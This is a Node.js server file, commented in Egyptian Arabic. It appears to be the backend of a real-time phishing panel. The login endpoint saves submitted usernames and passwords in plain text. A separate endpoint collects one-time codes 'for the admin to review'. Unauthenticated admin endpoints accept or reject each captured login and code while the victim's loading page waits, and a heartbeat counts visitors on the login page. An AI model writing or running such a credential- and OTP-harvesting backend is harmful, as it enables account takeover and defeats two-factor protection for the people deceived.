// server.js
// سيرفر بسيط بدون أي مكتبات خارجية (Node.js فقط)
// بيشتغل كبديل لقاعدة البيانات عن طريق ملف db.json
// شغّله بالأمر: node server.js

const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;
const DB_FILE = path.join(__dirname, 'db.json');

// ---------- تتبع الزيارات النشطة الحقيقية ----------
// كل صفحة مفتوحة (login.html) بتبعت "نبضة" (heartbeat) كل شوية ثواني.
// أي جلسة معملتش نبضة من فترة (HEARTBEAT_TIMEOUT) بتتحسب مش نشطة.
const activeSessions = {}; // sessionId -> آخر وقت نبضة
const HEARTBEAT_TIMEOUT_MS = 10000; // 10 ثواني

function countActiveVisits() {
  const now = Date.now();
  let count = 0;
  for (const id in activeSessions) {
    if (now - activeSessions[id] <= HEARTBEAT_TIMEOUT_MS) {
      count++;
    } else {
      delete activeSessions[id]; // تنظيف الجلسات القديمة
    }
  }
  return count;
}

// ---------- أدوات مساعدة للتعامل مع db.json ----------
function readDB() {
  const raw = fs.readFileSync(DB_FILE, 'utf8');
  return JSON.parse(raw);
}

function writeDB(data) {
  fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf8');
}

function sendJSON(res, statusCode, obj) {
  const body = JSON.stringify(obj);
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body)
  });
  res.end(body);
}

function readRequestBody(req, callback) {
  let chunks = '';
  req.on('data', (chunk) => { chunks += chunk; });
  req.on('end', () => {
    try {
      callback(null, chunks ? JSON.parse(chunks) : {});
    } catch (e) {
      callback(e, null);
    }
  });
}

// ---------- تحديد أنواع الملفات الثابتة ----------
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml'
};

function serveStaticFile(req, res, urlPath) {
  let filePath = urlPath === '/' ? '/login.html' : urlPath;
  filePath = path.join(__dirname, filePath);

  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('الملف غير موجود: ' + urlPath);
      return;
    }
    const ext = path.extname(filePath);
    const mime = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': mime });
    res.end(content);
  });
}

// ---------- السيرفر ----------
const server = http.createServer((req, res) => {
  const urlObj = new URL(req.url, `http://localhost:${PORT}`);
  const pathname = urlObj.pathname;

  // ---- API: تسجيل الدخول (تخزين طلب في قاعدة البيانات) ----
  if (pathname === '/api/login' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });

      const db = readDB();
      db.loginRequest = {
        username: body.username || '',
        password: body.password || '',
        status: 'pending',
        ts: Date.now()
      };
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: حالة طلب الدخول الحالي (يستخدمها loading.html) ----
  if (pathname === '/api/login-status' && req.method === 'GET') {
    const db = readDB();
    sendJSON(res, 200, db.loginRequest || null);
    return;
  }

  // ---- API: قرار الأدمن (قبول / رفض) ----
  if (pathname === '/api/decision' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });

      const db = readDB();
      if (!db.loginRequest) {
        return sendJSON(res, 400, { error: 'لا يوجد طلب دخول حالي' });
      }
      db.loginRequest.status = body.status; // 'accepted' or 'rejected'
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: مسح طلب الدخول بعد التعامل معه ----
  if (pathname === '/api/clear-request' && req.method === 'POST') {
    const db = readDB();
    db.loginRequest = null;
    writeDB(db);
    sendJSON(res, 200, { ok: true });
    return;
  }

  // ---- API: إرسال رمز التأكيد (OTP) عشان يراجعه الأدمن ----
  if (pathname === '/api/otp-submit' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
      const db = readDB();
      db.otpRequest = {
        code: body.code || '',
        status: 'pending',
        ts: Date.now()
      };
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: حالة طلب رمز التأكيد الحالي ----
  if (pathname === '/api/otp-status' && req.method === 'GET') {
    const db = readDB();
    sendJSON(res, 200, db.otpRequest || null);
    return;
  }

  // ---- API: قرار الأدمن على رمز التأكيد (قبول / رفض) ----
  if (pathname === '/api/otp-decision' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err) return sendJSON(res, 400, { error: 'بيانات غير صحيحة' });
      const db = readDB();
      if (!db.otpRequest) {
        return sendJSON(res, 400, { error: 'لا يوجد طلب رمز تأكيد حالي' });
      }
      db.otpRequest.status = body.status; // 'accepted' or 'rejected'
      writeDB(db);
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: مسح طلب رمز التأكيد بعد التعامل معه ----
  if (pathname === '/api/otp-clear' && req.method === 'POST') {
    const db = readDB();
    db.otpRequest = null;
    writeDB(db);
    sendJSON(res, 200, { ok: true });
    return;
  }

  // ---- API: نبضة (heartbeat) عشان تتبع الزيارات النشطة الحقيقية ----
  if (pathname === '/api/heartbeat' && req.method === 'POST') {
    readRequestBody(req, (err, body) => {
      if (err || !body.sessionId) return sendJSON(res, 400, { error: 'sessionId مطلوب' });
      activeSessions[body.sessionId] = Date.now();
      sendJSON(res, 200, { ok: true });
    });
    return;
  }

  // ---- API: قائمة المستخدمين (تستخدمها admin.html) ----
  if (pathname === '/api/users' && req.method === 'GET') {
    const db = readDB();
    sendJSON(res, 200, { users: db.users, activeVisits: countActiveVisits() });
    return;
  }

  // ---- أي طلب تاني: نعتبره ملف ثابت (html, css, js...) ----
  serveStaticFile(req, res, pathname);
});

server.listen(PORT, () => {
  console.log('السيرفر شغال دلوقتي على:');
  console.log('http://localhost:' + PORT);
  console.log('افتح الرابط ده في المتصفح عشان تشوف صفحة تسجيل الدخول');
});
